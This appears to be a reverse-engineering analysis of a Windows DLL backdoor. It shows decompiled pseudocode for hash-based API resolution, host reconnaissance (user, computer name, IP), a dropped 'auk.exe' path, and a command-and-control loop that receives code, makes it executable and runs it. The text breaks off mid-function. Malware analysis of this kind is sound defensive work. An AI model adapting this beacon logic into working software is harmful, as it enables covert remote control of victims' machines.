- dllmain
```bash
BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
  struct _LIST_ENTRY *kernel32_OutputDebugStringA; // rax
  struct _LIST_ENTRY *kernel32_CreateThread; // rbx
  __int64 v5; // rax

  if ( fdwReason == 1 )
  {
    kernel32_OutputDebugStringA = FindModuleByHash(449530704);
    ((void (__fastcall *)(const char *))kernel32_OutputDebugStringA)("DLL_PROCESS_ATTACH");
    kernel32_CreateThread = FindModuleByHash(644231116);
    v5 = pos_shellcode_addr();
    ((void (__fastcall *)(_QWORD, _QWORD, char *, void *, _DWORD, _QWORD))kernel32_CreateThread)(
      0,
      0,
      (char *)sub_7FF88D683F60 + v5 - (_QWORD)pos_shellcode_addr,
      &unk_7FF88D69C9F0,
      0,
      0);
  }
  return 1;
}
```
- main function `sub_7FF88D683F60`
```bash
__int64 __fastcall sub_7FF88D683F60(__int64 a1)
{
  __int64 (*kernel32_GetProcessHeap)(void); // rax
  __int64 heap_handle; // rbx
  __int64 (__fastcall *ntdll_RtlAlocateHeap)(__int64, __int64, __int64); // rax
  __int64 heap_allocated_addr; // rax

  kernel32_GetProcessHeap = (__int64 (*)(void))FindModuleByHash(-1175317699);
  heap_handle = kernel32_GetProcessHeap();
  ntdll_RtlAlocateHeap = (__int64 (__fastcall *)(__int64, __int64, __int64))sub_7FF88D6810B0();
  heap_allocated_addr = ntdll_RtlAlocateHeap(heap_handle, 8, 152);
  if ( heap_allocated_addr )
    heap_allocated_addr = InitNetworkAndSystemData(heap_allocated_addr);
  main_beacon(heap_allocated_addr, a1);
  return 0;
}
```
- The function for init malware configure 
```bash
__int64 *__fastcall InitNetworkAndSystemData(__int64 *a1)
{
  void (__fastcall *ws2_32_WSAStartup_1)(__int64, _BYTE *); // rax
  __int64 (*kernel32_GetProcessHeap)(void); // rax
  __int64 v4; // rbx
  __int64 (__fastcall *ntdll_RtlAllocateHeap)(__int64, __int64, __int64); // rax
  __int64 v6; // rax
  struct _LIST_ENTRY *kernel32_GetProcessHeap_1; // rax
  __int64 v8; // rcx
  __int64 v9; // rbx
  __int64 (__fastcall *ntdll_RtlAllocateHeap_1)(__int64, __int64, __int64); // rax
  __int64 v11; // rax
  __int64 v12; // rbx
  void (__fastcall *advapi32_GetUserNameA)(__int64, int *); // rax
  struct _LIST_ENTRY *kernel32_GetProcessHeap_2; // rax
  __int64 v15; // rcx
  __int64 v16; // rbx
  __int64 (__fastcall *ntdll_RtlAllocateHeap_2)(__int64, __int64, __int64); // rax
  __int64 v18; // rax
  __int64 v19; // rbx
  struct _LIST_ENTRY *kernel32_GetWindowsDirectoryA; // rax
  __int64 v21; // rbx
  struct _LIST_ENTRY *kernel32_lstrcat; // rax
  struct _LIST_ENTRY *kernel32_GetNativeSystemInfo; // rax
  bool v24; // al
  __int64 (*kernel32_GetProcessHeap_3)(void); // rax
  __int64 v26; // rbx
  __int64 (__fastcall *ntdll_RtlAllocateHeap_3)(__int64, __int64, __int64); // rax
  __int64 v28; // rax
  __int64 v29; // rbx
  void (__fastcall *msvcrt_memset)(__int64, _QWORD, __int64); // rax
  __int64 v31; // rbx
  struct _LIST_ENTRY *kernel32_GetComputerNameA; // rax
  __int64 v33; // rbx
  void (__fastcall *advapi32_GetUserNameA_1)(__int64, int *); // rax
  unsigned int (__fastcall *ws2_32_gethostname)(_BYTE *, __int64); // rax
  __int64 (__fastcall *ws2_32_gethostbyname)(_BYTE *); // rax
  __int64 v37; // rax
  __int64 v38; // rbx
  void (__fastcall *msvcrt_memcpy)(int *, __int64, __int64); // rax
  __int64 (__fastcall *ws2_32_inet_ntoa)(_QWORD); // rax
  __int64 v41; // rbx
  struct _LIST_ENTRY *kernel32_lstrlen; // rax
  int v43; // eax
  __int64 v44; // rsi
  __int64 (__fastcall *ws2_32_inet_ntoa_1)(_QWORD); // rax
  __int64 v46; // rax
  __int64 v47; // rdi
  __int64 v48; // rbx
  void (__fastcall *msvcrt_memcpy_1)(__int64, __int64, __int64); // rax
  __int64 v50; // rbx
  void (__fastcall *msvcrt_memcpy_2)(__int64, int *, __int64); // rax
  int v53; // [rsp+20h] [rbp-E0h] BYREF
  int v54; // [rsp+24h] [rbp-DCh] BYREF
  _WORD ws2_32_WSAStartup[28]; // [rsp+28h] [rbp-D8h] BYREF
  _BYTE v56[416]; // [rsp+60h] [rbp-A0h] BYREF
  char v57[16]; // [rsp+200h] [rbp+100h] BYREF
  _BYTE v58[256]; // [rsp+210h] [rbp+110h] BYREF

  a1[2] = 0;
  *((_BYTE *)a1 + 49) = 0;
  a1[7] = 0;
  a1[8] = 0;
  ws2_32_WSAStartup_1 = (void (__fastcall *)(__int64, _BYTE *))sub_7FF88D681850(729474878);
  ws2_32_WSAStartup_1(514, v56);
  *((_BYTE *)a1 + 144) = 0;
  a1[4] = 0;
  a1[17] = 0;
  *((_DWORD *)a1 + 30) = 0x80000;
  kernel32_GetProcessHeap = (__int64 (*)(void))FindModuleByHash(-1175317699);
  v4 = kernel32_GetProcessHeap();
  ntdll_RtlAllocateHeap = (__int64 (__fastcall *)(__int64, __int64, __int64))sub_7FF88D6810B0();
  v6 = ntdll_RtlAllocateHeap(v4, 8, 0x80000);
  a1[12] = v6;
  a1[13] = v6;
  a1[14] = v6 + 16;
  v53 = 260;
  kernel32_GetProcessHeap_1 = FindModuleByHash(-1175317699);
  v9 = ((__int64 (__fastcall *)(__int64))kernel32_GetProcessHeap_1)(v8);
  ntdll_RtlAllocateHeap_1 = (__int64 (__fastcall *)(__int64, __int64, __int64))sub_7FF88D6810B0();
  v11 = ntdll_RtlAllocateHeap_1(v9, 8, 260);
  a1[1] = v11;
  v12 = v11;
  advapi32_GetUserNameA = (void (__fastcall *)(__int64, int *))sub_7FF88D681430(1126229697);
  advapi32_GetUserNameA(v12, &v53);
  kernel32_GetProcessHeap_2 = FindModuleByHash(-1175317699);
  v16 = ((__int64 (__fastcall *)(__int64))kernel32_GetProcessHeap_2)(v15);
  ntdll_RtlAllocateHeap_2 = (__int64 (__fastcall *)(__int64, __int64, __int64))sub_7FF88D6810B0();
  v18 = ntdll_RtlAllocateHeap_2(v16, 8, 260);
  a1[16] = v18;
  v19 = v18;
  kernel32_GetWindowsDirectoryA = FindModuleByHash(-269553599);
  ((void (__fastcall *)(__int64, __int64))kernel32_GetWindowsDirectoryA)(v19, 260);
  v21 = a1[16];
  strcpy(v57, "\\Temp\\auk.exe");
  kernel32_lstrcat = FindModuleByHash(1460429150);
  ((void (__fastcall *)(__int64, char *))kernel32_lstrcat)(v21, v57);
  *((_BYTE *)a1 + 145) = 1;
  kernel32_GetNativeSystemInfo = FindModuleByHash(97250232);
  ((void (__fastcall *)(_WORD *))kernel32_GetNativeSystemInfo)(ws2_32_WSAStartup);
  v24 = ws2_32_WSAStartup[0] == 9 || ws2_32_WSAStartup[0] == 6;
  *((_BYTE *)a1 + 146) = v24;
  v53 = 260;
  kernel32_GetProcessHeap_3 = (__int64 (*)(void))FindModuleByHash(-1175317699);
  v26 = kernel32_GetProcessHeap_3();
  ntdll_RtlAllocateHeap_3 = (__int64 (__fastcall *)(__int64, __int64, __int64))sub_7FF88D6810B0();
  v28 = ntdll_RtlAllocateHeap_3(v26, 8, 632);
  *a1 = v28;
  v29 = v28;
  msvcrt_memset = (void (__fastcall *)(__int64, _QWORD, __int64))sub_7FF88D6812D0(94614379);
  msvcrt_memset(v29, 0, 632);
  v31 = *a1;
  a1[10] = *a1;
  kernel32_GetComputerNameA = FindModuleByHash(-325566287);
  ((void (__fastcall *)(__int64, int *))kernel32_GetComputerNameA)(v31 + 16, &v53);
  v33 = a1[10];
  advapi32_GetUserNameA_1 = (void (__fastcall *)(__int64, int *))sub_7FF88D681430(1126229697);
  advapi32_GetUserNameA_1(v33 + 276, &v53);
  ws2_32_gethostname = (unsigned int (__fastcall *)(_BYTE *, __int64))sub_7FF88D681850(2026671679);
  if ( ws2_32_gethostname(v58, 256) != -1 )
  {
    ws2_32_gethostbyname = (__int64 (__fastcall *)(_BYTE *))sub_7FF88D681850(3286108250LL);
    v37 = ws2_32_gethostbyname(v58);
    if ( v37 )
    {
      v38 = **(_QWORD **)(v37 + 24);
      msvcrt_memcpy = (void (__fastcall *)(int *, __int64, __int64))sub_7FF88D6812D0(94597323);
      msvcrt_memcpy(&v54, v38, 4);
      LODWORD(v38) = v54;
      ws2_32_inet_ntoa = (__int64 (__fastcall *)(_QWORD))sub_7FF88D681850(3214514401LL);
      v41 = ws2_32_inet_ntoa((unsigned int)v38);
      kernel32_lstrlen = FindModuleByHash(1460756741);
      v43 = ((__int64 (__fastcall *)(__int64))kernel32_lstrlen)(v41);
      LODWORD(v41) = v54;
      v44 = v43;
      ws2_32_inet_ntoa_1 = (__int64 (__fastcall *)(_QWORD))sub_7FF88D681850(3214514401LL);
      v46 = ws2_32_inet_ntoa_1((unsigned int)v41);
      v47 = a1[10];
      v48 = v46;
      msvcrt_memcpy_1 = (void (__fastcall *)(__int64, __int64, __int64))sub_7FF88D6812D0(94597323);
      msvcrt_memcpy_1(v47 + 536, v48, v44);
    }
  }
  v50 = a1[10];
  v53 = 0x312E3156;
  msvcrt_memcpy_2 = (void (__fastcall *)(__int64, int *, __int64))sub_7FF88D6812D0(94597323);
  msvcrt_memcpy_2(v50 + 600, &v53, 4);
  return a1;
}
```
- main beacon function
```bash
void __fastcall main_beacon(__int64 a1, __int64 a2)
{
  struct _LIST_ENTRY *kernel32_CreateMutexA; // rax
  unsigned int (*kernel32_GetLastError)(void); // rax
  __int64 v6; // rdi
  void (__fastcall *ws2_32_closesocket_3)(__int64); // rax
  __int64 (*kernel32_GetProcessHeap)(void); // rax
  __int64 v9; // rdi
  __int64 (__fastcall *kernel32_RltAllocateHeap_3)(__int64, __int64, __int64); // rax
  _QWORD *v11; // rax
  __int64 v12; // rcx
  struct _LIST_ENTRY *kernel32_OutputDebugStringA_1; // rax
  __int64 v14; // rsi
  __int64 (*kernel32_GetProcessHeap_10)(void); // rax
  __int64 v16; // rdi
  struct _LIST_ENTRY *kernel32_HeapFree_6; // rax
  struct _LIST_ENTRY *kernel32_Sleep_1; // rax
  __int64 v19; // rdi
  void (__fastcall *ws2_32_closesocket_2)(__int64); // rax
  __int64 v21; // rax
  __int64 v22; // rsi
  __int64 (*kernel32_GetProcessHeap_1)(void); // rax
  __int64 v24; // rdi
  struct _LIST_ENTRY *kernel32_HeapFree; // rax
  __int64 v26; // rax
  __int64 v27; // rsi
  __int64 (*kernel32_GetProcessHeap_2)(void); // rax
  __int64 v29; // rdi
  struct _LIST_ENTRY *kernel32_HeapFree_1; // rax
  unsigned int v31; // edi
  __int64 v32; // rsi
  void (__fastcall *msvcrt_memset)(__int64, _QWORD, _QWORD); // rax
  __int64 v34; // r14
  __int64 **v35; // r15
  int v36; // esi
  __int64 v37; // rdi
  __int64 (__fastcall *ws2_32_recv)(__int64, __int64, _QWORD, _QWORD); // rax
  int v39; // eax
  __int64 v40; // rcx
  __int64 v41; // rdx
  int v42; // eax
  __int128 *v43; // rcx
  int *v44; // r14
  __int64 v45; // r15
  _BYTE *v46; // rdi
  __int64 v47; // rsi
  void (__fastcall *msvcrt_memcpy)(_BYTE *, char *, __int64); // rax
  unsigned int v49; // eax
  unsigned __int8 v50; // cl
  unsigned __int8 v51; // r8
  __int64 v52; // r10
  _WORD *v53; // r9
  __int64 v54; // rax
  __int64 v55; // rsi
  __int64 (*kernel32_GetProcessHeap_4)(void); // rax
  __int64 v57; // rdi
  struct _LIST_ENTRY *kernel32_HeapFree_3; // rax
  __int64 v59; // rsi
  void (__fastcall *v60)(__int64 *); // rdi
  struct _LIST_ENTRY *kernel32_VirtualProtect; // rax
  char *v62; // r9
  __int64 v63; // r14
  unsigned __int16 *v64; // r15
  unsigned __int8 v65; // al
  __int64 v66; // rsi
  __int64 v67; // rdx
  __int64 (*kernel32_GetProcessHeap_5)(void); // rax
  __int64 v69; // rdi
  __int64 (__fastcall *kernel32_RltAllocateHeap)(__int64, __int64, __int64); // rax
  __int64 v71; // rdi
  void (__fastcall *msvcrt_memcpy_1)(__int64, __int64, __int64); // rax
  __int64 (__fastcall *v73)(_QWORD); // rdi
  struct _LIST_ENTRY *kernel32_VirtualProtect_1; // rax
  unsigned __int16 **v75; // rax
  __int64 v76; // r8
  _QWORD *v77; // r9
  unsigned __int64 v78; // r8
  __int64 v79; // rsi
  __int64 v80; // rax
  __int64 (*kernel32_GetProcessHeap_6)(void); // rax
  __int64 v82; // rdi
  __int64 (__fastcall *kernel32_RltAllocateHeap_1)(__int64, __int64, __int64); // rax
  __int64 v84; // rsi
  __int64 (*kernel32_GetProcessHeap_7)(void); // rax
  __int64 v86; // rdi
  __int64 (__fastcall *kernel32_RltAllocateHeap_2)(__int64, __int64, __int64); // rax
  unsigned int v88; // esi
  __int64 v89; // rdi
  void (__fastcall *ws2_32_closesocket_1)(__int64); // rax
  struct _LIST_ENTRY *kernel32_Sleep; // rax
  void (__fastcall *v92)(_QWORD); // rsi
  unsigned int v93; // edi
  struct _LIST_ENTRY *kernel32_VirtualProtect_2; // rax
  __int64 v95; // rdi
  struct _LIST_ENTRY *kernel32_CreateFileA; // rax
  __int64 v97; // r14
  unsigned int v98; // edi
  __int64 v99; // rsi
  struct _LIST_ENTRY *kernel32_WriteFile; // rax
  struct _LIST_ENTRY *kernel32_CloseHandle; // rax
  unsigned int (*shell32_IsUserAnAdmin)(void); // rax
  __int64 v103; // rcx
  __int64 v104; // rax
  __int64 v105; // rsi
  __int64 (*kernel32_GetProcessHeap_9)(void); // rax
  __int64 v107; // rdi
  struct _LIST_ENTRY *kernel32_HeapFree_5; // rax
  __int64 v109; // rdi
  struct _LIST_ENTRY *kernel32_GetExitCodeProcess; // rax
  __int64 v111; // rcx
  __int64 v112; // rax
  __int64 v113; // rsi
  __int64 (*kernel32_GetProcessHeap_8)(void); // rax
  __int64 v115; // rdi
  struct _LIST_ENTRY *kernel32_HeapFree_4; // rax
  struct _LIST_ENTRY *kernel32_OutputDebugStringA; // rax
  __int64 v118; // rdi
  void (__fastcall *ws2_32_closesocket)(__int64); // rax
  __int64 v120; // rsi
  __int64 (*kernel32_GetProcessHeap_3)(void); // rax
  __int64 v122; // rdi
  struct _LIST_ENTRY *kernel32_HeapFree_2; // rax
  struct _LIST_ENTRY *kernel32_Sleep_2; // rax
  __int64 v125; // rdi
  void (__fastcall *ws2_32_closesocket_4)(__int64); // rax
  __int64 v127; // rbx
  struct _LIST_ENTRY *kernel32_CloseHandle_1; // rax
  __int64 v129; // [rsp+20h] [rbp-89h]
  _BYTE v130[4]; // [rsp+40h] [rbp-69h] BYREF
  int v131; // [rsp+44h] [rbp-65h] BYREF
  int v132; // [rsp+48h] [rbp-61h] BYREF
  int v133; // [rsp+4Ch] [rbp-5Dh] BYREF
  int v134; // [rsp+50h] [rbp-59h] BYREF
  int v135; // [rsp+54h] [rbp-55h] BYREF
  int v136; // [rsp+58h] [rbp-51h] BYREF
  __int64 v137; // [rsp+60h] [rbp-49h] BYREF
  int v138; // [rsp+68h] [rbp-41h]
  int v139; // [rsp+6Ch] [rbp-3Dh]
  __int64 v140; // [rsp+70h] [rbp-39h]
  char v141; // [rsp+78h] [rbp-31h] BYREF
  char v142; // [rsp+7Ch] [rbp-2Dh] BYREF
  _BYTE v143[4]; // [rsp+80h] [rbp-29h] BYREF
  _BYTE v144[4]; // [rsp+84h] [rbp-25h] BYREF
  _QWORD *v145; // [rsp+88h] [rbp-21h]
  __int128 v146; // [rsp+90h] [rbp-19h] BYREF
  char v147[8]; // [rsp+A0h] [rbp-9h] BYREF
  char v148[16]; // [rsp+A8h] [rbp-1h] BYREF
  char v149[16]; // [rsp+B8h] [rbp+Fh] BYREF
  _BYTE v150[16]; // [rsp+C8h] [rbp+1Fh] BYREF

  if ( a2 )
  {
    if ( check_system(a1) )
    {
      *(_QWORD *)(a1 + 40) = a2;
      if ( !*(_BYTE *)(a2 + 27)
        || (strcpy(
              v147,
              "V4.0"),                                // = 0x0
            kernel32_CreateMutexA = FindModuleByHash(385772936),
            *(_QWORD *)(a1 + 16) = ((__int64 (__fastcall *)(_QWORD, _QWORD, char *))kernel32_CreateMutexA)(0, 0, v147),
            kernel32_GetLastError = (unsigned int (*)(void))FindModuleByHash(0xC7E0265E),
            kernel32_GetLastError() != 183) )
      {
        while ( !*(_BYTE *)(a1 + 144) )
        {
          sub_7FF88D681E70(a1 + 48);
          if ( (unsigned int)check_conection_to_server(a1) )
          {
            kernel32_GetProcessHeap = (__int64 (*)(void))FindModuleByHash(0xB9F2133D);
            v9 = kernel32_GetProcessHeap();
            kernel32_RltAllocateHeap_3 = (__int64 (__fastcall *)(__int64, __int64, __int64))sub_7FF88D6810B0();
            v11 = (_QWORD *)kernel32_RltAllocateHeap_3(v9, 8, 16);
            v145 = v11;
            if ( v11 )
              *v11 = a1 + 88;
            else
              v11 = 0;
            *(_QWORD *)(a1 + 72) = v11;
            if ( (unsigned int)init_crypto(a1) )
            {
              if ( !*(_BYTE *)(a1 + 49) )
              {
                LOBYTE(v12) = 8;
                v21 = prepare_c2_packet(v12, a1 + 145, 1u, &v132);
                v22 = v21;
                if ( v21 )
                {
                  send_data(*(__int64 ***)(a1 + 72), v21, v132);
                  kernel32_GetProcessHeap_1 = (__int64 (*)(void))FindModuleByHash(0xB9F2133D);
                  v24 = kernel32_GetProcessHeap_1();
                  kernel32_HeapFree = FindModuleByHash(0xBB9549C0);
                  ((void (__fastcall *)(__int64, _QWORD, __int64))kernel32_HeapFree)(v24, 0, v22);
                }
              }
              if ( !*(_QWORD *)(a1 + 32) )
              {
                LOBYTE(v12) = 5;
                v26 = prepare_c2_packet(v12, a1 + 145, 1u, &v133);
                v27 = v26;
                if ( v26 )
                {
                  send_data(*(__int64 ***)(a1 + 72), v26, v133);
                  kernel32_GetProcessHeap_2 = (__int64 (*)(void))FindModuleByHash(0xB9F2133D);
                  v29 = kernel32_GetProcessHeap_2();
                  kernel32_HeapFree_1 = FindModuleByHash(0xBB9549C0);
                  ((void (__fastcall *)(__int64, _QWORD, __int64))kernel32_HeapFree_1)(v29, 0, v27);
                }
              }
              while ( 1 )
              {
                while ( 1 )
                {
                  while ( 1 )
                  {
                    while ( 1 )
                    {
                      while ( 1 )
                      {
LABEL_21:
                        if ( *(_BYTE *)(a1 + 144) )
                          goto LABEL_101;
                        v31 = *(_DWORD *)(a1 + 120);
                        v32 = *(_QWORD *)(a1 + 96);
                        msvcrt_memset = (void (__fastcall *)(__int64, _QWORD, _QWORD))sub_7FF88D6812D0(94614379);
                        msvcrt_memset(v32, 0, v31);
                        v34 = *(_QWORD *)(a1 + 96);
                        v35 = *(__int64 ***)(a1 + 72);
                        v36 = 0;
                        do
                        {
                          v37 = **v35;
                          ws2_32_recv = (__int64 (__fastcall *)(__int64, __int64, _QWORD, _QWORD))sub_7FF88D681850(4210192);
                          v39 = ws2_32_recv(v37, v34 + v36, (unsigned int)(16 - v36), 0);
                          v36 += v39;
                        }
                        while ( v39 > 0 && v36 < 16 );
                        if ( v36 != 16 || **(_DWORD **)(a1 + 96) != 0x37F457D1 )
                        {
LABEL_97:
                          strcpy(v149, "Recv  failed");
                          kernel32_OutputDebugStringA = FindModuleByHash(449530704);
                          ((void (__fastcall *)(char *))kernel32_OutputDebugStringA)(v149);
                          v118 = ***(_QWORD ***)(a1 + 72);
                          ws2_32_closesocket = (void (__fastcall *)(__int64))sub_7FF88D681850(1575151903);
                          ws2_32_closesocket(v118);
                          v120 = *(_QWORD *)(a1 + 72);
                          if ( v120 )
                          {
                            kernel32_GetProcessHeap_3 = (__int64 (*)(void))FindModuleByHash(0xB9F2133D);
                            v122 = kernel32_GetProcessHeap_3();
                            kernel32_HeapFree_2 = FindModuleByHash(0xBB9549C0);
                            ((void (__fastcall *)(__int64, _QWORD, __int64))kernel32_HeapFree_2)(v122, 0, v120);
                          }
                          goto LABEL_99;
                        }
                        v41 = *(_QWORD *)(a1 + 104);
                        if ( *(_DWORD *)(v41 + 12) )
                        {
                          v42 = ((__int64 (__fastcall *)(_QWORD, _QWORD))receive_data)(
                                  *(_QWORD *)(a1 + 72),
                                  *(_QWORD *)(a1 + 112));
                          v43 = *(__int128 **)(a1 + 104);
                          v44 = (int *)v43 + 3;
                          if ( v42 != *((_DWORD *)v43 + 3) )
                            goto LABEL_97;
                          v146 = *v43;
                          v45 = *(_QWORD *)(a1 + 112);
                          v46 = v150;
                          v47 = 4;
                          do
                          {
                            msvcrt_memcpy = (void (__fastcall *)(_BYTE *, char *, __int64))sub_7FF88D6812D0(0x5A370CB);
                            msvcrt_memcpy(v46, (char *)&v146 + 4, 4);
                            v46 += 4;
                            --v47;
                          }
                          while ( v47 );
                          if ( !(unsigned int)sub_7FF88D681B10(0, (unsigned int)v150, v45, *v44, v45, (__int64)v44) )
                            *v44 = 0;
                          v41 = *(_QWORD *)(a1 + 104);
                        }
                        v49 = *(_DWORD *)(v41 + 8);
                        if ( v49 <= 0xF )
                          break;
                        v50 = 0;
                        v51 = *(_BYTE *)(a1 + 49);
                        if ( v51 )
                        {
                          v52 = *(_QWORD *)(a1 + 56);
                          while ( 1 )
                          {
                            v53 = *(_WORD **)(v52 + 8LL * v50);
                            if ( v53[4] == (unsigned __int8)v49 )
                              break;
                            if ( ++v50 >= v51 )
                              goto LABEL_21;
                          }
                          if ( v53 )
                            (*(void (__fastcall **)(_QWORD, _QWORD, _QWORD))(*(_QWORD *)v53 + 8LL))(
                              *(_QWORD *)(v52 + 8LL * v50),
                              *(_QWORD *)(a1 + 112),
                              *(unsigned int *)(v41 + 12));
                        }
                      }
                      if ( v49 != 10 )
                        break;
                      LOBYTE(v40) = 8;
                      v54 = prepare_c2_packet(v40, a1 + 145, 1u, &v134);
                      v55 = v54;
                      if ( v54 )
                      {
                        send_data(*(__int64 ***)(a1 + 72), v54, v134);
                        kernel32_GetProcessHeap_4 = (__int64 (*)(void))FindModuleByHash(0xB9F2133D);
                        v57 = kernel32_GetProcessHeap_4();
                        kernel32_HeapFree_3 = FindModuleByHash(0xBB9549C0);
                        ((void (__fastcall *)(__int64, _QWORD, __int64))kernel32_HeapFree_3)(v57, 0, v55);
                      }
                    }
                    if ( v49 != 5 )
                      break;
                    process_c2_data(a1);
                  }
                  if ( v49 != 6 )
                    break;
                  v59 = *(unsigned int *)(a1 + 24);
                  if ( (_DWORD)v59 )
                  {
                    v60 = *(void (__fastcall **)(__int64 *))(a1 + 32);
                    if ( v60 )
                    {
                      v137 = *(_QWORD *)(a1 + 112);
                      v138 = *(_DWORD *)(v41 + 12);
                      v139 = 0;
                      v140 = *(_QWORD *)(a1 + 16);
                      kernel32_VirtualProtect = FindModuleByHash(2011822024);
                      v62 = &v141;
LABEL_51:
                      ((void (__fastcall *)(void (__fastcall *)(__int64 *), __int64, __int64, char *))kernel32_VirtualProtect)(
                        v60,
                        v59,
                        64,
                        v62);
                      v60(&v137);
                      goto LABEL_21;
                    }
                  }
                }
                switch ( v49 )
                {
                  case 7u:
                    v59 = *(unsigned int *)(a1 + 24);
                    if ( (_DWORD)v59 )
                    {
                      v60 = *(void (__fastcall **)(__int64 *))(a1 + 32);
                      if ( v60 )
                      {
                        v137 = *(_QWORD *)(a1 + 112);
                        v138 = *(_DWORD *)(v41 + 12);
                        v139 = 1;
                        v140 = *(_QWORD *)(a1 + 16);
                        kernel32_VirtualProtect = FindModuleByHash(2011822024);
                        v62 = &v142;
                        goto LABEL_51;
                      }
                    }
                    break;
                  case 8u:
                    v63 = *(_QWORD *)(a1 + 112);
                    v64 = *(unsigned __int16 **)(a1 + 72);
                    v65 = *(_BYTE *)(a1 + 49);
                    if ( v65 != *(_BYTE *)(a1 + 48) )
                    {
                      v66 = *(unsigned int *)(v41 + 12);
                      if ( *(_DWORD *)(v41 + 12) )
                      {
                        kernel32_GetProcessHeap_5 = (__int64 (*)(void))FindModuleByHash(0xB9F2133D);
                        v69 = kernel32_GetProcessHeap_5();
                        kernel32_RltAllocateHeap = (__int64 (__fastcall *)(__int64, __int64, __int64))sub_7FF88D6810B0();
                        v67 = kernel32_RltAllocateHeap(v69, 8, v66);
                        v65 = *(_BYTE *)(a1 + 49);
                      }
                      else
                      {
                        v67 = 0;
                      }
                      *(_QWORD *)(*(_QWORD *)(a1 + 64) + 8LL * v65) = v67;
                      v71 = *(_QWORD *)(*(_QWORD *)(a1 + 64) + 8LL * *(unsigned __int8 *)(a1 + 49));
                      msvcrt_memcpy_1 = (void (__fastcall *)(__int64, __int64, __int64))sub_7FF88D6812D0(94597323);
                      msvcrt_memcpy_1(v71, v63, v66);
                      v73 = *(__int64 (__fastcall **)(_QWORD))(*(_QWORD *)(a1 + 64) + 8LL
                                                                                    * *(unsigned __int8 *)(a1 + 49));
                      kernel32_VirtualProtect_1 = FindModuleByHash(2011822024);
                      ((void (__fastcall *)(__int64 (__fastcall *)(_QWORD), __int64, __int64, _BYTE *))kernel32_VirtualProtect_1)(
                        v73,
                        v66,
                        64,
                        v143);
                      v75 = (unsigned __int16 **)v73(0);
                      v76 = *(_QWORD *)(*(_QWORD *)(a1 + 64) + 8LL * *(unsigned __int8 *)(a1 + 49));
                      v77 = *v75;
                      *v77 = **v75 + v76 - 4096;
                      v77[1] = *((unsigned __int16 *)v77 + 4) + v76 - 4096;
                      v75[2] = v64;
                      *(_QWORD *)(*(_QWORD *)(a1 + 56) + 8LL * (unsigned __int8)(*(_BYTE *)(a1 + 49))++) = v75;
                    }
                    break;
                  case 9u:
                    sub_7FF88D681E70(a1 + 48);
                    v78 = **(unsigned __int8 **)(a1 + 112);
                    *(_WORD *)(a1 + 48) = (unsigned __int8)v78;
                    if ( (_BYTE)v78 )
                    {
                      v79 = 8 * v78;
                      if ( !is_mul_ok(v78, 8u) )
                        v79 = -1;
                      if ( v79 )
                      {
                        kernel32_GetProcessHeap_6 = (__int64 (*)(void))FindModuleByHash(0xB9F2133D);
                        v82 = kernel32_GetProcessHeap_6();
                        kernel32_RltAllocateHeap_1 = (__int64 (__fastcall *)(__int64, __int64, __int64))sub_7FF88D6810B0();
                        v80 = kernel32_RltAllocateHeap_1(v82, 8, v79);
                        LOBYTE(v78) = *(_BYTE *)(a1 + 48);
                      }
                      else
                      {
                        v80 = 0;
                      }
                      *(_QWORD *)(a1 + 56) = v80;
                      v84 = 8LL * (unsigned __int8)v78;
                      if ( !is_mul_ok((unsigned __int8)v78, 8u) )
                        v84 = -1;
                      if ( v84 )
                      {
                        kernel32_GetProcessHeap_7 = (__int64 (*)(void))FindModuleByHash(0xB9F2133D);
                        v86 = kernel32_GetProcessHeap_7();
                        kernel32_RltAllocateHeap_2 = (__int64 (__fastcall *)(__int64, __int64, __int64))sub_7FF88D6810B0();
                        *(_QWORD *)(a1 + 64) = kernel32_RltAllocateHeap_2(v86, 8, v84);
                      }
                      else
                      {
                        *(_QWORD *)(a1 + 64) = 0;
                      }
                    }
                    break;
                  case 3u:
                    if ( *(_DWORD *)(v41 + 12) == 4 )
                    {
                      v88 = 60000 * **(_DWORD **)(a1 + 112);
                      if ( v88 )
                      {
                        v89 = ***(_QWORD ***)(a1 + 72);
                        ws2_32_closesocket_1 = (void (__fastcall *)(__int64))sub_7FF88D681850(1575151903);
                        ws2_32_closesocket_1(v89);
                        kernel32_Sleep = FindModuleByHash(102426073);
                        ((void (__fastcall *)(_QWORD))kernel32_Sleep)(v88);
                      }
                      else
                      {
                        *(_BYTE *)(a1 + 144) = 1;
                      }
                    }
                    break;
                  case 4u:
                    *(_BYTE *)(a1 + 144) = 1;
                    v92 = *(void (__fastcall **)(_QWORD))(a1 + 32);
                    if ( v92 )
                    {
                      v93 = *(_DWORD *)(a1 + 24);
                      kernel32_VirtualProtect_2 = FindModuleByHash(2011822024);
                      ((void (__fastcall *)(void (__fastcall *)(_QWORD), _QWORD, __int64, _BYTE *))kernel32_VirtualProtect_2)(
                        v92,
                        v93,
                        64,
                        v144);
                      v92(0);
                    }
                    break;
                  case 0xEu:
                    *(_QWORD *)(a1 + 32) = 0;
                    *(_BYTE *)(a1 + 144) = 1;
                    break;
                  case 0xBu:
                    execute_C2_payload(a1);
                    break;
                  case 0xDu:
                    v95 = *(_QWORD *)(a1 + 128);
                    kernel32_CreateFileA = FindModuleByHash(2948629);
                    LODWORD(v129) = 1;
                    v97 = ((__int64 (__fastcall *)(__int64, __int64, _QWORD, _QWORD, __int64, _DWORD, _QWORD))kernel32_CreateFileA)(
                            v95,
                            0x40000000,
                            0,
                            0,
                            v129,
                            0,
                            0);
                    if ( v97 != -1 )
                    {
                      v98 = *(_DWORD *)(*(_QWORD *)(a1 + 104) + 12LL);
                      v99 = *(_QWORD *)(a1 + 112);
                      kernel32_WriteFile = FindModuleByHash(1948279307);
                      ((void (__fastcall *)(__int64, __int64, _QWORD, char *, _QWORD))kernel32_WriteFile)(
                        v97,
                        v99,
                        v98,
                        v147,
                        0);
                      kernel32_CloseHandle = FindModuleByHash(1292304930);
                      ((void (__fastcall *)(__int64))kernel32_CloseHandle)(v97);
                    }
                    break;
                  case 0xCu:
                    shell32_IsUserAnAdmin = (unsigned int (*)(void))sub_7FF88D6816F0();
                    if ( shell32_IsUserAnAdmin() )
                    {
                      v131 = 0;
                      v109 = *(_QWORD *)(a1 + 136);
                      kernel32_GetExitCodeProcess = FindModuleByHash(0x8368D2B4);
                      ((void (__fastcall *)(__int64, int *))kernel32_GetExitCodeProcess)(v109, &v131);
                      if ( v131 == 259 )
                      {
                        v130[0] = 5;
                        LOBYTE(v111) = 11;
                        v112 = prepare_c2_packet(v111, (int)v130, 1u, &v136);
                        v113 = v112;
                        if ( v112 )
                        {
                          send_data(*(__int64 ***)(a1 + 72), v112, v136);
